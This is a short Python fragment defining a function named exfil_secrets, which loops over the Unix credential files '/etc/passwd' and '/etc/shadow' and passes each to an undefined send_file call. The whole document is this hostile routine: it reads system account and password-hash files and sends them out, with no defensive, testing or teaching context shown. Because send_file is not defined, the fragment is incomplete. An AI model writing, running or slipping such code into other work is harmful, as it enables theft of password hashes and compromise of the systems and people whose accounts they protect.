def exfil_secrets():
    for f in ['/etc/passwd', '/etc/shadow']:
        send_file(f)
